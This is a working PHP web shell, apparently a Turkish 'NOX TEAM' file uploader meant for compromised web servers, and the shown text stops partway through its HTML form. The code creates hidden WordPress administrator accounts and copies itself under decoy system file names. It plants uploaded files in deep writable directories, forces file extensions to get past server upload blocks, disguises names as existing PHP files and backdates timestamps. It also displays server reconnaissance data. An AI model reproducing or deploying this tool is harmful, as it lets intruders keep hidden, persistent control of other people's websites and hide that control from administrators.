<?php
session_start();

define('PASSWORD_HASH', '$2a$12$6OvmhUeIFo8/w3vFe63.3.bvn/L2cQgkeaQOLG5oaDPhDXmis6F/W');

$loginError = '';

// Çıkış
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Giriş işlemi
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !isset($_FILES['file'])) {
    if (password_verify($_POST['password'], PASSWORD_HASH)) {
        session_regenerate_id(true);
        $_SESSION['auth'] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $loginError = 'HATA: Geçersiz şifre. Erişim reddedildi.';
    }
}

$authenticated = !empty($_SESSION['auth']);

// ── WP ADMIN OLUŞTURUCU ──
$wpMsg  = '';
$wpType = '';
if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['action']) && $_POST['action'] === 'wp_create_admin') {

    $wpUser  = trim($_POST['wp_user'] ?? '');
    $wpPass  = trim($_POST['wp_pass'] ?? '');
    $wpEmail = trim($_POST['wp_email'] ?? '');
    $docR    = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');

    if (!$wpUser || !$wpPass || !$wpEmail) {
        $wpMsg  = 'HATA: Tüm alanlar zorunlu.';
        $wpType = 'error';
    } else {
        // wp-load.php'yi bul
        $wpLoad = null;
        foreach ([$docR.'/wp-load.php', $docR.'/../wp-load.php'] as $p) {
            if (file_exists($p)) { $wpLoad = $p; break; }
        }

        if (!$wpLoad) {
            $wpMsg  = 'HATA: wp-load.php bulunamadı. WordPress kurulu mu?';
            $wpType = 'error';
        } else {
            // WordPress'i yükle
            define('SHORTINIT', false);
            @include_once($wpLoad);

            if (!function_exists('wp_create_user')) {
                $wpMsg  = 'HATA: WordPress fonksiyonları yüklenemedi.';
                $wpType = 'error';
            } elseif (username_exists($wpUser)) {
                $wpMsg  = "HATA: '$wpUser' kullanıcı adı zaten mevcut.";
                $wpType = 'error';
            } elseif (email_exists($wpEmail)) {
                $wpMsg  = "HATA: '$wpEmail' e-posta zaten kayıtlı.";
                $wpType = 'error';
            } else {
                $userId = wp_create_user($wpUser, $wpPass, $wpEmail);
                if (is_wp_error($userId)) {
                    $wpMsg  = 'HATA: ' . $userId->get_error_message();
                    $wpType = 'error';
                } else {
                    // Admin rolü ver
                    $user = new WP_User($userId);
                    $user->set_role('administrator');
                    $wpMsg  = "OK: Admin oluşturuldu → Kullanıcı: $wpUser | ID: $userId";
                    $wpType = 'success';
                }
            }
        }
    }
}

// ── KENDİNİ GİZLE ──
$hideMessage = '';
$hideLink = '';
if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'hide_self') {
    $systemNames = [
        'bootstrap.php','config.php','loader.php','init.php','core.php',
        'helper.php','functions.php','common.php','runtime.php','base.php',
        'autoload.php','registry.php','global.php','handler.php','router.php',
        'setup.php','kernel.php','app.php','module.php','service.php',
    ];
    $subDirs = ['includes','assets','lib','src','vendor','static','resources','data','cache','tmp'];

    shuffle($systemNames);
    shuffle($subDirs);

    $chosenName = $systemNames[0];
    $chosenSub  = $subDirs[0];
    $targetSubDir = __DIR__ . DIRECTORY_SEPARATOR . $chosenSub;

    if (!is_dir($targetSubDir)) {
        @mkdir($targetSubDir, 0755);
    }

    $destPath = $targetSubDir . DIRECTORY_SEPARATOR . $chosenName;

    if (file_exists($destPath)) {
        $chosenName = $systemNames[1] ?? ('core_' . substr(md5(time()), 0, 6) . '.php');
        $destPath = $targetSubDir . DIRECTORY_SEPARATOR . $chosenName;
    }

    if (@copy(__FILE__, $destPath)) {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $baseUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['REQUEST_URI']), '/') . '/';
        $hideLink = $baseUrl . $chosenSub . '/' . $chosenName;
        $hideMessage = "OK: Kopyalandı → /$chosenSub/$chosenName";
    } else {
        $hideMessage = 'HATA: Kopyalanamadı. Yazma izni kontrol edin.';
    }
}



// ── LOG YARDIMCILARI ──
// Log dosyası web root dışında — URL ile erişilemez
$_logParent = dirname($_SERVER['DOCUMENT_ROOT']);
define('LOG_FILE',       (is_writable($_logParent) ? $_logParent : __DIR__) . '/.nox_log.json');
define('USED_DIRS_FILE', (is_writable($_logParent) ? $_logParent : __DIR__) . '/.nox_dirs.json');
define('DEEP_DIRS_FILE', (is_writable($_logParent) ? $_logParent : __DIR__) . '/.nox_deep.json');

function logRead(): array {
    if (!file_exists(LOG_FILE)) return [];
    $data = @json_decode(file_get_contents(LOG_FILE), true);
    return is_array($data) ? $data : [];
}

function logWrite(array $entry): void {
    $log = logRead();
    array_unshift($log, $entry); // en yeni üste
    file_put_contents(LOG_FILE, json_encode($log, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function spoofName(string $originalName, string $targetDir): string {
    $ext = pathinfo($originalName, PATHINFO_EXTENSION);
    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');

    // Sunucudaki tüm dosya isimlerini topla
    $names = [];
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($docRoot, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $it->setMaxDepth(4);
        foreach ($it as $item) {
            if ($item->isFile() && strtolower($item->getExtension()) === 'php') {
                $base = pathinfo($item->getFilename(), PATHINFO_FILENAME);
                // Anlamlı, kısa, latin karakter içerenleri al
                if (preg_match('/^[a-zA-Z0-9_\-\.]{3,40}$/', $base)) {
                    $names[] = $base;
                }
            }
            if (count($names) >= 200) break;
        }
    } catch (Exception $e) {}

    if (empty($names)) {
        // Fallback: jenerik sistem isimleri
        $names = ['core','runtime','loader','config','helper','common','global','init','base','handler'];
    }

    // Rastgele bir isim seç, çakışmayı önle
    shuffle($names);
    foreach ($names as $base) {
        $candidate = $base . ($ext ? '.' . $ext : '');
        if (!file_exists($targetDir . $candidate)) {
            return $candidate;
        }
    }

    // Hepsi çakışırsa hash ekle
    return pathinfo($names[0], PATHINFO_FILENAME) . '_' . substr(md5(uniqid()), 0,5) . ($ext ? '.' . $ext : '');
}

// ── UPLOAD (sadece giriş yapılmışsa) ──
$message = '';
$messageType = '';
$fileLink = '';

function findDeepDirs(string $root, int $maxDirs = 60): array {
    $result = [];
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $it->setMaxDepth(6);
        foreach ($it as $item) {
            if ($item->isDir() && is_writable($item->getPathname())) {
                $result[] = $item->getPathname();
                if (count($result) >= $maxDirs) break;
            }
        }
    } catch (Exception $e) {}
    // Derinliğe göre sırala (daha derin = daha gizli)
    usort($result, fn($a, $b) => substr_count($b, DIRECTORY_SEPARATOR) - substr_count($a, DIRECTORY_SEPARATOR));
    return $result;
}

if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $originalName = basename($file['name']);
    $hideFile     = !empty($_POST['hide_file']);
    $fakeDate     = !empty($_POST['fake_date']);
    $spoofName    = !empty($_POST['spoof_name']);
    $deepHideDir  = !empty($_POST['deep_hide_dir']);
    $customDir    = trim($_POST['custom_dir'] ?? '');
    $docRoot      = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');

    if ($deepHideDir && $customDir !== '' && $customDir !== '__default__') {
        // ── MOD 4: Seçili dizinde derin gizleme (per-base takip) ──
        $targetBase = rtrim($customDir, '/\\');
        if (!is_dir($targetBase) || !is_writable($targetBase)) {
            $targetDir = __DIR__ . DIRECTORY_SEPARATOR;
        } else {
            $deepDirs = findDeepDirs($targetBase);

            // Her base dizinin kendi kullanılmış subdir listesi
            $deepUsed = [];
            if (file_exists(DEEP_DIRS_FILE)) {
                $deepUsed = @json_decode(file_get_contents(DEEP_DIRS_FILE), true) ?: [];
            }
            $baseKey     = rtrim(str_replace('\\', '/', $targetBase), '/');
            $usedInBase  = $deepUsed[$baseKey] ?? [];

            $freshDirs = array_values(array_filter($deepDirs, function($d) use ($usedInBase) {
                return !in_array(rtrim(str_replace('\\','/',$d),'/'), $usedInBase);
            }));

            if (empty($freshDirs) && !empty($deepDirs)) {
                // Bu base için tüm alt dizinler kullanıldı — sadece bu base'i sıfırla
                $deepUsed[$baseKey] = [];
                file_put_contents(DEEP_DIRS_FILE, json_encode($deepUsed));
                $freshDirs = $deepDirs;
            }

            if (empty($freshDirs)) {
                // Seçili dizinde hiç alt dizin yok — sahte iç içe yapı oluştur
                $fakeSegments = [
                    ['cache', 'data'],
                    ['assets', 'img', 'thumb'],
                    [date('Y'), date('m')],
                    ['static', 'files'],
                    ['lib', 'core'],
                ];
                shuffle($fakeSegments);
                $fakePath = $targetBase;
                foreach ($fakeSegments[0] as $seg) {
                    $fakePath .= DIRECTORY_SEPARATOR . $seg;
                    @mkdir($fakePath, 0755, true);
                }
                $freshDirs = [$fakePath];
            }

            shuffle($freshDirs);
            $targetDir = $freshDirs[0] . DIRECTORY_SEPARATOR;
        }

    } elseif ($hideFile) {
        // ── MOD 1: Sunucu genelinde rastgele derin gizleme ──
        $usedDirs = [];
        if (file_exists(USED_DIRS_FILE)) {
            $usedDirs = @json_decode(file_get_contents(USED_DIRS_FILE), true) ?: [];
        }

        $deepDirs = findDeepDirs($docRoot);

        $freshDirs = array_values(array_filter($deepDirs, function($d) use ($usedDirs) {
            return !in_array(rtrim(str_replace('\\','/',$d),'/'), $usedDirs);
        }));

        if (empty($freshDirs)) {
            file_put_contents(USED_DIRS_FILE, json_encode([]));
            $freshDirs = $deepDirs;
        }

        shuffle($freshDirs);
        $targetDir = ($freshDirs[0] ?? __DIR__) . DIRECTORY_SEPARATOR;

    } elseif ($customDir !== '' && $customDir !== '__default__') {
        // ── MOD 2: Belirtilen dizine direkt yükleme ──
        if (is_dir($customDir) && is_writable($customDir)) {
            $targetDir = rtrim($customDir, '/\\') . DIRECTORY_SEPARATOR;
        } else {
            $targetDir = __DIR__ . DIRECTORY_SEPARATOR;
        }
    } else {
        // ── MOD 3: Varsayılan (script dizini) ──
        $targetDir = __DIR__ . DIRECTORY_SEPARATOR;
    }

    // Uzantı değiştirme — sunucu engeli bypass
    $forceExt = trim($_POST['force_ext'] ?? '');
    $forceExt = ltrim(strtolower($forceExt), '.');
    if ($forceExt !== '') {
        $originalName = pathinfo($originalName, PATHINFO_FILENAME) . '.' . $forceExt;
    }

    $saveName   = $spoofName ? spoofName($originalName, $targetDir) : $originalName;
    $targetPath = $targetDir . $saveName;

    if ($file['error'] !== UPLOAD_ERR_OK) {
        $errors = [
            UPLOAD_ERR_INI_SIZE   => 'Dosya php.ini limitini aşıyor.',
            UPLOAD_ERR_FORM_SIZE  => 'Dosya form limitini aşıyor.',
            UPLOAD_ERR_PARTIAL    => 'Dosya eksik yüklendi.',
            UPLOAD_ERR_NO_FILE    => 'Dosya seçilmedi.',
            UPLOAD_ERR_NO_TMP_DIR => 'Geçici klasör bulunamadı.',
            UPLOAD_ERR_CANT_WRITE => 'Diske yazılamadı.',
            UPLOAD_ERR_EXTENSION  => 'PHP eklentisi yüklemeyi durdurdu.',
        ];
        $message = $errors[$file['error']] ?? 'Bilinmeyen hata.';
        $messageType = 'error';
    } elseif (file_exists($targetPath)) {
        $message = "HATA: '$originalName' zaten mevcut.";
        $messageType = 'error';
    } elseif (!move_uploaded_file($file['tmp_name'], $targetPath)) {
        $message = 'HATA: Dosya taşınamadı. Klasör yazma izni kontrol edin.';
        $messageType = 'error';
    } else {
        $size = number_format($file['size'] / 1024, 1);
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
        // Dosyanın web'deki göreceli yolunu hesapla
        $relPath = str_replace('\\', '/', substr($targetDir, strlen($docRoot)));
        $relPath = '/' . ltrim($relPath, '/');
        $fileUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . $relPath . rawurlencode($saveName);
        $tags = [];
        if ($hideFile)    $tags[] = 'HIDDEN';
        if ($deepHideDir) $tags[] = 'DEEP_HIDDEN→' . basename(rtrim($targetDir, '/\\'));
        if ($spoofName)   $tags[] = 'SPOOFED→' . $saveName;
        if ($fakeDate)    $tags[] = 'DATE_SPOOFED';
        $tagStr = $tags ? ' [' . implode(' | ', $tags) . ']' : '';
        $message = "OK$tagStr: $originalName ($size KB) — başarıyla yüklendi.";
        // Tarih manipülasyonu
        if ($fakeDate) {
            $yearsBack  = rand(1, 3);
            $randMonth  = rand(1, 12);
            $randDay    = rand(1, 28);
            $randHour   = rand(0, 23);
            $randMin    = rand(0, 59);
            $fakeTime   = mktime($randHour, $randMin, 0,
                            $randMonth, $randDay,
                            (int)date('Y') - $yearsBack);
            @touch($targetPath, $fakeTime, $fakeTime);
        }

        $fileLink = $fileUrl;
        $messageType = 'success';

        logWrite([
            'name'   => $originalName,
            'url'    => $fileUrl,
            'size'   => $file['size'],
            'path'   => $targetPath,
            'hidden' => $hideFile,
            'deep'   => $deepHideDir,
            'time'   => time(),
        ]);

        // Kullanılan dizini kaydet
        if ($hideFile) {
            $usedList = file_exists(USED_DIRS_FILE)
                ? (@json_decode(file_get_contents(USED_DIRS_FILE), true) ?: [])
                : [];
            $usedList[] = rtrim(str_replace('\\', '/', $targetDir), '/');
            $usedList = array_unique($usedList);
            file_put_contents(USED_DIRS_FILE, json_encode(array_values($usedList)));
        }

        // Mode 4 — per-base takip
        if ($deepHideDir) {
            $deepUsed = file_exists(DEEP_DIRS_FILE)
                ? (@json_decode(file_get_contents(DEEP_DIRS_FILE), true) ?: [])
                : [];
            $baseKey = rtrim(str_replace('\\', '/', rtrim($customDir, '/\\')), '/');
            $deepUsed[$baseKey][] = rtrim(str_replace('\\', '/', $targetDir), '/');
            $deepUsed[$baseKey]   = array_values(array_unique($deepUsed[$baseKey]));
            file_put_contents(DEEP_DIRS_FILE, json_encode($deepUsed));
        }
    }
}

$uploadLog = $authenticated ? logRead() : [];

// ── DOSYA OLUŞTURUCU ──
$createMsg  = '';
$createType = '';
$createLink = '';
if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['action']) && $_POST['action'] === 'create_file') {

    $cfName    = trim($_POST['cf_name'] ?? '');
    $cfContent = $_POST['cf_content'] ?? '';
    $cfDir     = trim($_POST['cf_dir'] ?? '');
    $cfFakeDate = !empty($_POST['cf_fake_date']);
    $docRootCf  = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');

    if ($cfName === '') {
        $createMsg  = 'HATA: Dosya adı boş olamaz.';
        $createType = 'error';
    } else {
        // Hedef dizini belirle
        if ($cfDir !== '' && $cfDir !== '__default__') {
            $cfTargetDir = rtrim($cfDir, '/\\') . DIRECTORY_SEPARATOR;
        } else {
            $cfTargetDir = __DIR__ . DIRECTORY_SEPARATOR;
        }

        if (!is_dir($cfTargetDir)) {
            $createMsg  = 'HATA: Hedef dizin bulunamadı.';
            $createType = 'error';
        } elseif (!is_writable($cfTargetDir)) {
            $createMsg  = 'HATA: Hedef dizine yazma izni yok.';
            $createType = 'error';
        } else {
            $cfPath = $cfTargetDir . basename($cfName);
            if (file_exists($cfPath)) {
                $createMsg  = "HATA: '$cfName' zaten mevcut.";
                $createType = 'error';
            } elseif (file_put_contents($cfPath, $cfContent) === false) {
                $createMsg  = 'HATA: Dosya yazılamadı. İzinleri kontrol edin.';
                $createType = 'error';
            } else {
                if ($cfFakeDate) {
                    $fakeT = mktime(rand(0,23), rand(0,59), 0, rand(1,12), rand(1,28), (int)date('Y') - rand(1,3));
                    @touch($cfPath, $fakeT, $fakeT);
                }
                $protocol  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                $relCfPath = str_replace('\\', '/', substr($cfTargetDir, strlen($docRootCf)));
                $relCfPath = '/' . ltrim($relCfPath, '/');
                $createLink = $protocol . '://' . $_SERVER['HTTP_HOST'] . $relCfPath . rawurlencode(basename($cfName));
                $cfSize = number_format(strlen($cfContent) / 1024, 2);
                $createMsg  = "OK: '$cfName' oluşturuldu ($cfSize KB)" . ($cfFakeDate ? ' [DATE_SPOOFED]' : '');
                $createType = 'success';
                logWrite([
                    'name'   => basename($cfName),
                    'url'    => $createLink,
                    'size'   => strlen($cfContent),
                    'path'   => $cfPath,
                    'hidden' => false,
                    'deep'   => false,
                    'time'   => time(),
                    'action' => 'create',
                ]);
            }
        }
    }
}

// Yazılabilir dizinler — sadece doc root'un direkt altı
$writableDirs = [];
$docRootScan  = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
if ($authenticated) {
    foreach (@scandir($docRootScan) ?: [] as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $full = $docRootScan . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($full) && is_writable($full)) {
            $writableDirs[] = $full;
        }
    }
    sort($writableDirs);
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NOX TEAM // FILE UPLOADER</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap');

:root {
  --green:  #00ff88;
  --green2: #00cc66;
  --bg:     #030d06;
  --panel:  #060e09;
  --border: #00ff8822;
  --red:    #ff3355;
  --gray:   #336644;
}

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: 'Share Tech Mono', monospace;
  background: var(--bg);
  color: var(--green);
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 32px 16px 60px;
  background-image:
    repeating-linear-gradient(0deg, transparent, transparent 28px, #00ff880a 29px),
    repeating-linear-gradient(90deg, transparent, transparent 28px, #00ff880a 29px);
}
body::before {
  content: '';
  position: fixed; inset: 0;
  background: repeating-linear-gradient(to bottom, transparent 0px, transparent 2px, #00000022 2px, #00000022 4px);
  pointer-events: none;
  z-index: 999;
}

.container { width: 100%; max-width: 700px; }

/* HEADER */
.header { text-align: center; margin-bottom: 36px; }
.header .tag { font-size: .75rem; color: var(--gray); letter-spacing: 4px; margin-bottom: 6px; }
.logo {
  font-family: 'Orbitron', monospace;
  font-size: 2.6rem; font-weight: 900;
  color: var(--green);
  text-shadow: 0 0 10px var(--green), 0 0 40px var(--green2), 0 0 80px #00ff8833;
  letter-spacing: 6px;
}
.logo span { color: #fff; text-shadow: 0 0 10px #fff, 0 0 30px var(--green); }
.sub { font-size: .7rem; color: var(--gray); letter-spacing: 8px; margin-top: 4px; }
.header-line {
  height: 1px;
  background: linear-gradient(90deg, transparent, var(--green), transparent);
  margin-top: 18px;
  box-shadow: 0 0 8px var(--green2);
}

/* PANEL */
.panel {
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 4px;
  margin-bottom: 20px;
  position: relative;
  overflow: hidden;
}
.panel::before {
  content: '';
  position: absolute; top: 0; left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, transparent, var(--green), transparent);
  box-shadow: 0 0 8px var(--green2);
}
.panel-header {
  display: flex; align-items: center; gap: 8px;
  padding: 10px 18px;
  border-bottom: 1px solid var(--border);
  font-size: .7rem; color: var(--gray); letter-spacing: 2px;
}
.panel-header .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); }
.panel-body { padding: 24px 20px; }

/* LOGIN FORM */
.login-wrap { text-align: center; }
.login-label { font-size: .75rem; color: var(--gray); letter-spacing: 3px; margin-bottom: 16px; display: block; }
.input-row {
  display: flex; gap: 10px; align-items: center;
  background: #020a04;
  border: 1px solid var(--green2);
  border-radius: 3px;
  padding: 4px 8px;
  max-width: 400px; margin: 0 auto;
}
.input-row span { color: var(--gray); font-size: .9rem; white-space: nowrap; }
.input-row input[type=password] {
  background: transparent;
  border: none; outline: none;
  color: var(--green);
  font-family: 'Share Tech Mono', monospace;
  font-size: .95rem;
  flex: 1;
  caret-color: var(--green);
  letter-spacing: 4px;
}
.input-row input[type=password]::placeholder { color: var(--gray); letter-spacing: 1px; font-size: .8rem; }

/* SESSION BAR */
.session-bar {
  display: flex; justify-content: space-between; align-items: center;
  padding: 8px 18px;
  background: #020a04;
  border: 1px solid var(--border);
  border-radius: 3px;
  margin-bottom: 20px;
  font-size: .72rem;
  color: var(--gray);
}
.session-bar .status { display: flex; align-items: center; gap: 6px; }
.session-bar .dot-green { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); }
.session-bar a {
  color: var(--red);
  text-decoration: none;
  letter-spacing: 1px;
  font-size: .7rem;
  border: 1px solid #ff335544;
  padding: 3px 10px;
  border-radius: 3px;
  transition: all .2s;
}
.session-bar a:hover { background: #ff335518; }

/* BUTTONS */
.btn {
  display: inline-flex; align-items: center; gap: 8px;
  margin-top: 16px;
  padding: 10px 32px;
  background: transparent;
  color: var(--green);
  font-family: 'Share Tech Mono', monospace;
  font-size: .9rem; font-weight: bold;
  letter-spacing: 3px;
  border: 1px solid var(--green2);
  border-radius: 3px;
  cursor: pointer;
  transition: all .2s;
  text-transform: uppercase;
}
.btn:hover { background: var(--green); color: var(--bg); box-shadow: 0 0 18px var(--green2); }
.btn-login { margin-top: 0; padding: 8px 20px; font-size: .8rem; letter-spacing: 2px; }

/* DROP AREA */
.drop-area {
  border: 1px dashed var(--green2);
  border-radius: 3px; padding: 38px 20px;
  text-align: center; cursor: pointer;
  transition: background .2s, border-color .2s;
}
.drop-area:hover, .drop-area.dragover {
  background: #00ff8808; border-color: var(--green);
  box-shadow: 0 0 16px #00ff8820 inset;
}
.drop-area .icon { color: var(--green2); margin-bottom: 12px; display: block; }
.drop-area .hint { font-size: .8rem; color: var(--gray); }
.drop-area .hint span { color: var(--green); }

input[type=file] { display: none; }
#selected-name { margin-top: 12px; font-size: .8rem; color: var(--green2); min-height: 1.2em; }
#selected-name::before { content: '> '; color: var(--gray); }

/* MESSAGES */
.message { padding: 14px 18px; border-radius: 3px; margin-bottom: 20px; font-size: .85rem; border-left: 3px solid; }
.success { background: #00ff8810; color: var(--green); border-color: var(--green); }
.error   { background: #ff335510; color: var(--red);   border-color: var(--red);   }

.file-link {
  display: inline-flex; align-items: center; gap: 6px;
  margin-top: 10px; padding: 6px 14px;
  background: #00ff8812; border: 1px solid var(--green2);
  border-radius: 3px; color: var(--green);
  text-decoration: none; font-size: .8rem; word-break: break-all;
  transition: background .2s;
}
.file-link:hover { background: #00ff8822; }

/* FILE LIST */
.file-list { list-style: none; }
.file-list li {
  display: flex; justify-content: space-between; align-items: center;
  padding: 9px 4px; border-bottom: 1px solid var(--border);
  font-size: .82rem; transition: background .15s;
}
.file-list li:last-child { border-bottom: none; }
.file-list li:hover { background: #00ff8806; }
.file-list li::before { content: '> '; color: var(--gray); margin-right: 4px; flex-shrink: 0; }
.fname { color: var(--green); text-decoration: none; word-break: break-all; flex: 1; }
.fname:hover { text-decoration: underline; text-underline-offset: 3px; }
.fsize { color: var(--gray); white-space: nowrap; margin-left: 14px; font-size: .75rem; }
.empty { color: var(--gray); text-align: center; padding: 24px; font-size: .85rem; }

/* FOOTER */
.footer { text-align: center; font-size: .65rem; color: var(--gray); letter-spacing: 3px; margin-top: 8px; }
.footer span { color: var(--green2); }

/* HIDE FILE CHECKBOX */
.hide-check {
  display: inline-flex; align-items: center; gap: 10px;
  margin-top: 14px; cursor: pointer; font-size: .8rem;
  color: var(--green); letter-spacing: 1px; user-select: none;
}
.hide-check input[type=checkbox] { display: none; }
.check-box {
  width: 16px; height: 16px; flex-shrink: 0;
  border: 1px solid var(--red); border-radius: 2px;
  display: inline-flex; align-items: center; justify-content: center;
  transition: background .2s;
}
.hide-check input:checked + .check-box {
  background: var(--red);
  box-shadow: 0 0 8px var(--red);
}
.hide-check input:checked + .check-box::after {
  content: '✓'; font-size: .7rem; color: var(--bg); font-weight: bold;
}

@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
.cursor { display: inline-block; width: 8px; height: 14px; background: var(--green); vertical-align: middle; margin-left: 2px; animation: blink 1s step-end infinite; }

@keyframes shake {
  0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-6px)} 40%,80%{transform:translateX(6px)}
}
.shake { animation: shake .4s ease; }
</style>
</head>
<body>
<div class="container">

  <div class="header">
    <div class="tag">// SECURE FILE TRANSFER //</div>
    <div class="logo">N<span>O</span>X <span>T</span>EAM</div>
    <div class="sub">FILE UPLOADER v2.0<span class="cursor"></span></div>
    <div class="header-line"></div>
  </div>

<?php if (!$authenticated): ?>

  <!-- ── GİRİŞ EKRANI ── -->
  <?php if ($loginError): ?>
  <div class="message error"><?= htmlspecialchars($loginError) ?></div>
  <?php endif; ?>

  <div class="panel">
    <div class="panel-header">
      <div class="dot"></div>
      AUTH_REQUIRED
    </div>
    <div class="panel-body">
      <div class="login-wrap">
        <span class="login-label">// KIMLIK DOĞRULAMA GEREKLİ //</span>
        <form method="POST" id="loginForm">
          <div class="input-row" id="inputRow">
            <span>root@nox:~$</span>
            <input type="password" name="password" placeholder="şifre girin..." autofocus autocomplete="off">
            <button type="submit" class="btn btn-login">ACCESS</button>
          </div>
        </form>
        <div style="margin-top:18px;font-size:.72rem;color:var(--gray);">
          [ Yetkisiz erişim tespit edilecektir ]
        </div>
      </div>
    </div>
  </div>

<?php else: ?>

  <!-- ── SESSION BAR ── -->
  <div class="session-bar">
    <div class="status">
      <div class="dot-green"></div>
      SESSION_ACTIVE &mdash; ERİŞİM YETKİLİ
    </div>
    <a href="?logout=1">[ ÇIKIŞ ]</a>
  </div>

  <!-- ── MAKİNE BİLGİSİ ── -->
  <?php
  $machineInfo = [
    'HOSTNAME'   => @gethostname() ?: 'N/A',
    'SERVER IP'  => $_SERVER['SERVER_ADDR'] ?? 'N/A',
    'CLIENT IP'  => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A',
    'OS'         => PHP_OS . ' ' . (function_exists('php_uname') ? php_uname('r') : ''),
    'PHP'        => PHP_VERSION,
    'SERVER'     => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'USER'       => function_exists('get_current_user') ? get_current_user() : 'N/A',
    'DOC ROOT'   => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
    'FREE DISK'  => function_exists('disk_free_space') ? @round(disk_free_space($_SERVER['DOCUMENT_ROOT']) / 1073741824, 1) . ' GB' : 'N/A',
    'SAFE MODE'  => ini_get('safe_mode') ? 'ON' : 'OFF',
  ];
  ?>
  <div class="panel" style="border-color:#ff335533;margin-bottom:20px;">
    <div class="panel-header" style="border-color:#ff335522;">
      <div class="dot" style="background:var(--red);box-shadow:0 0 6px var(--red);"></div>
      <span style="color:var(--red);">SYS_INFO</span>
    </div>
    <div class="panel-body" style="padding:12px 20px;">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
        <?php foreach ($machineInfo as $key => $val): ?>
        <div style="display:flex;gap:8px;align-items:baseline;font-size:.75rem;padding:4px 8px;border:1px solid #ff335518;border-radius:3px;">
          <span style="color:var(--red);white-space:nowrap;min-width:80px;"><?= $key ?></span>
          <span style="color:#ffaaaa;word-break:break-all;"><?= htmlspecialchars(trim($val)) ?></span>
        </div>
        <?php endforeach; ?>
      </div>
    </div>
  </div>

  <!-- ── MESAJ ── -->
  <?php if ($message): ?>
  <div class="message <?= $messageType ?>">
    <?= htmlspecialchars($message) ?>
    <?php if ($messageType === 'success' && isset($fileLink)): ?>
    <br>
    <a class="file-link" href="<?= htmlspecialchars($fileLink) ?>" target="_blank">
      <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>
      <?= htmlspecialchars($fileLink) ?>
    </a>
    <?php endif; ?>
  </div>
  <?php endif; ?>

  <!-- ── UPLOAD ── -->
  <div class="panel">
    <div class="panel-header">
      <div class="dot"></div>
      UPLOAD_MODULE
    </div>
    <div class="panel-body">
      <form method="POST" enctype="multipart/form-data" id="uploadForm">
        <div class="drop-area" id="dropArea" onclick="document.getElementById('fileInput').click()">
          <svg class="icon" width="44" height="44" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M17 8l-5-5-5 5M12 3v12"/>
          </svg>
          <div class="hint">Tıkla veya <span>sürükle &amp; bırak</span></div>
        </div>
        <input type="file" name="file" id="fileInput">
        <div id="selected-name"></div>
        <label class="hide-check">
          <input type="checkbox" name="hide_file" value="1" id="hideCheck">
          <span class="check-box"></span>
          HIDE FILE <span style="color:var(--gray);font-size:.75rem;">— sunucuda rastgele derin dizine gönder</span>
        </label>
        <label class="hide-check" style="margin-top:8px;">
          <input type="checkbox" name="fake_date" value="1" id="fakeDateCheck">
          <span class="check-box"></span>
          SPOOF DATE <span style="color:var(--gray);font-size:.75rem;">— yükleme tarihini geçmişe çek</span>
        </label>
        <label class="hide-check" style="margin-top:8px;">
          <input type="checkbox" name="spoof_name" value="1" id="spoofNameCheck">
          <span class="check-box"></span>
          SPOOF NAME <span style="color:var(--gray);font-size:.75rem;">— sunucudaki gerçek dosya ismine benzet</span>
        </label>
